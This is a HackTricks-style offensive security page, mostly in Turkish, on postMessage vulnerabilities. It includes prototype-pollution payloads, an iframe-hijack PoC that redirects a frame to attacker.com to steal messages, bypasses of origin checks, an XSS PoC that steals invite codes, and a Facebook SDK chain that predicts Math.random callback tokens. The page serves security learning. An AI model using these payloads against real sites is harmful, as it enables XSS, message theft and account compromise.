# PostMessage Zafiyetleri

{{#include ../../banners/hacktricks-training.md}}

## Gönder **PostMessage**

**PostMessage** mesaj göndermek için aşağıdaki fonksiyonu kullanır:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Not: **targetOrigin** bir '\*' veya _https://company.com._ gibi bir URL olabilir.\
İkinci senaryoda, **mesaj yalnızca o domaine gönderilebilir** (Window object'un origin'i farklı olsa bile).\
Eğer **wildcard** kullanılırsa, **mesajlar herhangi bir domaine gönderilebilir**, ve Window object'in origin'ine gönderilir.

### iframe & wildcard ile **targetOrigin**'e saldırı

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) eğer `X-Frame-Header` koruması olmayan ve **iframed** edilebilen bir sayfa bulursanız ve bu sayfa **postMessage** ile **wildcard** (\*) kullanarak **hassas** mesaj gönderiyorsa, **iframe**'in **origin**'ini **modify** ederek **hassas** mesajı sizin kontrolünüzdeki bir domaine leak edebilirsiniz.\
Unutmayın ki, eğer sayfa iframed edilebiliyorsa ama **targetOrigin** **bir wildcard yerine bir URL olarak ayarlanmışsa**, bu **hile işe yaramaz**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** JS tarafından **`postMessages` bekleyen** fonksiyonu tanımlamak için kullanılan fonksiyondur.\
Aşağıdaki gibi bir kod kullanılacaktır:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Bir mesajın **`e.source`** değerini null yapmaya **postMessage** **gönderen** ve **hemen silinen** bir **iframe** oluşturarak zorlayabilirsiniz.

Daha fazla bilgi için **okuyun:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Bu saldırıları gerçekleştirmek için ideal olarak bir `iframe` içine **hedef web sayfasını** koyabilmelisiniz. Ancak `X-Frame-Header` gibi bazı header'lar bu **davranışı** **engelleyebilir**.\
Bu senaryolarda daha az gizli bir saldırı kullanabilirsiniz. Zafiyetli web uygulamasına yeni bir sekme açıp onunla iletişim kurabilirsiniz:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayı engelleyerek child iframe'e gönderilen mesajı çalma

Aşağıdaki sayfada, veriler gönderilmeden önce **main** sayfayı **engelleyerek** ve bir **child** içindeki **XSS**'i kötüye kullanarak **child iframe**'e gönderilen **hassas postmessage verisini** elde edip veriler alınmadan önce **leak the data** nasıl yapılacağını görebilirsiniz:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe konumunu değiştirerek mesaj çalma

Eğer içinde başka bir iframe bulunduran ve X-Frame-Header olmayan bir webpage'i iframeleyebiliyorsanız, o child iframe'in konumunu **değiştirebilirsiniz**, böylece eğer **postmessage**'ı bir **wildcard** kullanarak alıyorsa, bir saldırgan bu iframe'in **origin**'ini kendisinin **kontrol ettiği** bir sayfaya **değiştirip** mesajı **çalabilir**:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage ile Prototype Pollution ve/veya XSS

postMessage aracılığıyla gönderilen verilerin JS tarafından yürütüldüğü senaryolarda, sayfayı **iframe**leyip, exploit'i `postMessage` ile göndererek **Prototype Pollution/XSS**'i istismar edebilirsiniz.

Bu konuda **`postMessage` ile çok iyi açıklanmış birkaç XSS örneği** şu adreste bulunabilir: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Bir `postMessage` ile bir `iframe`'e gönderilen ve **Prototype Pollution ve sonra XSS**'i kötüye kullanan bir exploit örneği:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
For **more information**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Mesaj doğrulaması `Math.random()` ile üretilen bir “shared secret” kullandığında (ör., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) ve aynı yardımcı fonksiyon plugin iframe'lerine isim veriyorsa, PRNG çıktıları geri elde edilebilir ve güvenilir mesajlar taklit edilebilir:

- **Leak PRNG outputs via `window.name`:** SDK, plugin iframe'lerini `guid()` ile otomatik olarak isimlendirir. Eğer top frame'i kontrol ediyorsanız, hedef sayfayı iframe'e alın, ardından plugin iframe'ini kendi origin'inize yönlendirip (ör., `window.frames[0].frames[0].location='https://attacker.com'`) `window.frames[0].frames[0].name`'i okuyarak ham bir `Math.random()` çıktısı elde edebilirsiniz.
- **Force more outputs without reloads:** Bazı SDK'lar bir reinit yolu sunar; FB SDK'da `{xfbml:1}` ile `init:post` tetiklemek `XFBML.parse()`'i zorlar, plugin iframe'ini yok edip yeniden oluşturur ve yeni isim/callback ID'leri üretir. Tekrarlı reinit gerektiği kadar PRNG çıktısı üretir (callback/iframe ID'leri için ekstra dahili `Math.random()` çağrıları olduğunu not edin; bu yüzden çözücülerin ara değerleri atlaması gerekir).
- **Trusted-origin delivery via parameter pollution:** Eğer bir first-party plugin endpoint'i temizlenmemiş bir parametreyi cross-window payload içine yansıtıyorsa (ör., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), `&type=...&iconSVG=...` enjekte ederek trusted `facebook.com` origin'ini koruyabilirsiniz.
- **Predict the next callback:** Sızdırılmış iframe isimlerini `[0,1)` aralığında float'lara çevirin ve birkaç değeri (ardışık olmasalar bile) V8 `Math.random` tahmin aracına verin (ör., Z3-tabanlı). Beklenen callback token'ını taklit etmek için sonraki `guid()`'ı yerelde oluşturun.
- **Trigger the sink:** postMessage verisini öyle hazırlayın ki bridge `xd.mpn.setupIconIframe`'i dispatch etsin ve `iconSVG` içine HTML enjekte etsin (ör., URL-encoded `<img src=x onerror=...>`), böylece hosting origin içinde DOM XSS elde edilir; oradan same-origin iframe'ler (OAuth dialogları, arbiters, vb.) okunabilir.
- **Framing quirks help:** Zincir framing gerektirir. Bazı mobil webview'larda, `frame-ancestors` varken `X-Frame-Options` desteklenmeyen `ALLOW-FROM`'a gerileyebilir ve “compat” parametreleri izin verici `frame-ancestors`'ı zorlayarak `window.name` side channel'ını etkinleştirebilir.

#### Minimal sahte mesaj örneği
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referanslar

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Pratik yapmak için: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
